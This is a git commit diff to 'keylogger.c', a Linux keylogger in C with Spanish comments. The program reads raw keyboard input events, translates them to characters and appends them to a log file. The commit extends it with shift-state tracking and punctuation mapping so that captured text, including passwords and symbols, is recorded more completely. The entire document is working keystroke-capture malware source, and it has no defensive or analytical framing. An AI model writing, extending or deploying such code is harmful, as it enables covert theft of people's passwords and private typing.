246990297187ee1fbaca0239308e1f8f508d73a8
ArthurLeywinT1 <142830897+ArthurLeywinT1@users.noreply.github.com>
2024-08-15 13:44:51 -0600

    Update keylogger.c

--- keylogger.c
+++ keylogger.c
@@ -11,9 +11,10 @@
 
 // Prototipo de función
 char *getEvent();
+void logKey(FILE *fp, const char *output);
 
 // Función para traducir el código de la tecla a un carácter imprimible
-char translateKeyCode(int code);
+void translateKeyCode(int code, int shift, char *output);
 
 int main(){
     struct input_event ev;
@@ -33,14 +34,25 @@ int main(){
         return 1;
     }
 
+    int shift_pressed = 0;
     while (1) {
         read(device_keyboard, &ev, sizeof(ev));
-        if (ev.type == EV_KEY && ev.value == 0) { // Tecla liberada
-            char c = translateKeyCode(ev.code);
-            if (c) {
-                printf("%c\n", c);
-                fputc(c, fp);
-                fflush(fp);
+        if (ev.type == EV_KEY) {
+            if (ev.value == 1) { // Tecla presionada
+                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
+                    shift_pressed = 1;
+                }
+            } else if (ev.value == 0) { // Tecla liberada
+                char output[16] = {0}; // Espacio para teclas especiales
+                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
+                    shift_pressed = 0;
+                } else {
+                    translateKeyCode(ev.code, shift_pressed, output);
+                    if (strlen(output) > 0) {
+                        printf("%s", output);
+                        logKey(fp, output);
+                    }
+                }
             }
         }
     }
@@ -61,48 +73,64 @@ char *getEvent(){
     return event;
 }
 
-char translateKeyCode(int code) {
+void translateKeyCode(int code, int shift, char *output) {
     switch(code) {
-        case KEY_A: return 'a';
-        case KEY_B: return 'b';
-        case KEY_C: return 'c';
-        case KEY_D: return 'd';
-        case KEY_E: return 'e';
-        case KEY_F: return 'f';
-        case KEY_G: return 'g';
-        case KEY_H: return 'h';
-        case KEY_I: return 'i';
-        case KEY_J: return 'j';
-        case KEY_K: return 'k';
-        case KEY_L: return 'l';
-        case KEY_M: return 'm';
-        case KEY_N: return 'n';
-        case KEY_O: return 'o';
-        case KEY_P: return 'p';
-        case KEY_Q: return 'q';
-        case KEY_R: return 'r';
-        case KEY_S: return 's';
-        case KEY_T: return 't';
-        case KEY_U: return 'u';
-        case KEY_V: return 'v';
-        case KEY_W: return 'w';
-        case KEY_X: return 'x';
-        case KEY_Y: return 'y';
-        case KEY_Z: return 'z';
-        case KEY_1: return '1';
-        case KEY_2: return '2';
-        case KEY_3: return '3';
-        case KEY_4: return '4';
-        case KEY_5: return '5';
-        case KEY_6: return '6';
-        case KEY_7: return '7';
-        case KEY_8: return '8';
-        case KEY_9: return '9';
-        case KEY_0: return '0';
-        case KEY_SPACE: return ' ';
-        case KEY_ENTER: return '\n';
-        case KEY_BACKSPACE: return '\b';
-        // Puedes agregar más casos según los códigos que necesites manejar
-        default: return 0;
+        case KEY_A: strcpy(output, shift ? "A" : "a"); break;
+        case KEY_B: strcpy(output, shift ? "B" : "b"); break;
+        case KEY_C: strcpy(output, shift ? "C" : "c"); break;
+        case KEY_D: strcpy(output, shift ? "D" : "d"); break;
+        case KEY_E: strcpy(output, shift ? "E" : "e"); break;
+        case KEY_F: strcpy(output, shift ? "F" : "f"); break;
+        case KEY_G: strcpy(output, shift ? "G" : "g"); break;
+        case KEY_H: strcpy(output, shift ? "H" : "h"); break;
+        case KEY_I: strcpy(output, shift ? "I" : "i"); break;
+        case KEY_J: strcpy(output, shift ? "J" : "j"); break;
+        case KEY_K: strcpy(output, shift ? "K" : "k"); break;
+        case KEY_L: strcpy(output, shift ? "L" : "l"); break;
+        case KEY_M: strcpy(output, shift ? "M" : "m"); break;
+        case KEY_N: strcpy(output, shift ? "N" : "n"); break;
+        case KEY_O: strcpy(output, shift ? "O" : "o"); break;
+        case KEY_P: strcpy(output, shift ? "P" : "p"); break;
+        case KEY_Q: strcpy(output, shift ? "Q" : "q"); break;
+        case KEY_R: strcpy(output, shift ? "R" : "r"); break;
+        case KEY_S: strcpy(output, shift ? "S" : "s"); break;
+        case KEY_T: strcpy(output, shift ? "T" : "t"); break;
+        case KEY_U: strcpy(output, shift ? "U" : "u"); break;
+        case KEY_V: strcpy(output, shift ? "V" : "v"); break;
+        case KEY_W: strcpy(output, shift ? "W" : "w"); break;
+        case KEY_X: strcpy(output, shift ? "X" : "x"); break;
+        case KEY_Y: strcpy(output, shift ? "Y" : "y"); break;
+        case KEY_Z: strcpy(output, shift ? "Z" : "z"); break;
+        case KEY_1: strcpy(output, shift ? "!" : "1"); break;
+        case KEY_2: strcpy(output, shift ? "@" : "2"); break;
+        case KEY_3: strcpy(output, shift ? "#" : "3"); break;
+        case KEY_4: strcpy(output, shift ? "$" : "4"); break;
+        case KEY_5: strcpy(output, shift ? "%" : "5"); break;
+        case KEY_6: strcpy(output, shift ? "^" : "6"); break;
+        case KEY_7: strcpy(output, shift ? "&" : "7"); break;
+        case KEY_8: strcpy(output, shift ? "*" : "8"); break;
+        case KEY_9: strcpy(output, shift ? "(" : "9"); break;
+        case KEY_0: strcpy(output, shift ? ")" : "0"); break;
+        case KEY_SPACE: strcpy(output, " "); break;
+        case KEY_ENTER: strcpy(output, "\n"); break;
+        case KEY_BACKSPACE: strcpy(output, "\b"); break;
+        case KEY_TAB: strcpy(output, "\t"); break;
+        case KEY_MINUS: strcpy(output, shift ? "_" : "-"); break;
+        case KEY_EQUAL: strcpy(output, shift ? "+" : "="); break;
+        case KEY_LEFTBRACE: strcpy(output, shift ? "{" : "["); break;
+        case KEY_RIGHTBRACE: strcpy(output, shift ? "}" : "]"); break;
+        case KEY_BACKSLASH: strcpy(output, shift ? "|" : "\\"); break;
+        case KEY_SEMICOLON: strcpy(output, shift ? ":" : ";"); break;
+        case KEY_APOSTROPHE: strcpy(output, shift ? "\"" : "'"); break;
+        case KEY_COMMA: strcpy(output, shift ? "<" : ","); break;
+        case KEY_DOT: strcpy(output, shift ? ">" : "."); break;
+        case KEY_SLASH: strcpy(output, shift ? "?" : "/"); break;
+        // Agrega más teclas especiales si es necesario
+        default: output[0] = 0;
     }
+}
+
+void logKey(FILE *fp, const char *output) {
+    fputs(output, fp);
+    fflush(fp);
 }
